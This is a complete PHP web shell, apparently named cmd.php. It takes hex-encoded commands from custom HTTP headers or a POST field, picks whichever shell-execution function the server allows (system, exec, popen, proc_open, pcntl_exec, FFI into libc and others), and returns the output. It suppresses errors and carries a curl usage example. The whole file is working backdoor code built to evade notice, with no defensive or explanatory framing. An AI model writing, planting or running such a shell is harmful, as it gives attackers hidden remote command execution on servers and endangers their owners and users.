<?php
//curl -s -H "X-R: 6964" http://localhost/cmd.php
@error_reporting(0);
$raw = '';
foreach (['HTTP_X_R', 'HTTP_X_TOKEN', 'HTTP_X_C'] as $k) {
    if (!empty($_SERVER[$k])) { $raw = $_SERVER[$k]; break; }
}
if ($raw === '' && isset($_POST['r'])) $raw = $_POST['r'];

if ($raw === '' || !ctype_xdigit(str_replace(':', '', $raw))) exit;
$pos = strpos($raw, ':');
if ($pos !== false) {
    $fn  = @hex2bin(substr($raw, 0, $pos));
    $cmd = @hex2bin(substr($raw, $pos + 1));
} else {
    $fn  = '';
    $cmd = @hex2bin($raw);
}
unset($raw);
if (!is_string($cmd) || $cmd === '') exit;

$is_cli = (PHP_SAPI === 'cli');
$usable = function ($c) use ($is_cli) {
    if (!function_exists($c)) return false;
    if ($c === 'pcntl_exec' && !$is_cli)                     return false;
    if ($c === 'ffi'        && !extension_loaded('ffi'))     return false;
    if ($c === 'expect'     && !extension_loaded('expect'))  return false;
    return true;
};

$cands = ['shell_exec','system','passthru','exec','popen','proc_open','pcntl_exec','ffi','expect'];

if ($fn === '' || !$usable($fn)) {
    $fn = '';
    foreach ($cands as $c) if ($usable($c)) { $fn = $c; break; }
}
if ($fn === '') exit;
switch ($fn) {
    case 'shell_exec': echo shell_exec($cmd); break;
    case 'system':     system($cmd); break;
    case 'passthru':   passthru($cmd); break;
    case 'exec':       $o=[]; exec($cmd,$o); echo implode("\n",$o); break;
    case 'popen':
        $h = popen($cmd, 'r');
        if ($h) { while (!feof($h)) echo fread($h, 4096); pclose($h); }
        break;
    case 'proc_open':
        $d = [1=>['pipe','w'], 2=>['pipe','w']];
        $p = proc_open($cmd, $d, $pipes);
        if (is_resource($p)) {
            echo stream_get_contents($pipes[1]);
            echo stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]); proc_close($p);
        }
        break;
    case 'pcntl_exec':
        pcntl_exec('/bin/sh', ['-c', $cmd]);
        break;
    case 'ffi':
        $lib = PHP_OS_FAMILY === 'Windows' ? 'msvcrt.dll' : 'libc.so.6';
        $f = FFI::cdef("int system(const char *);", $lib);
        $f->system($cmd);
        break;
}
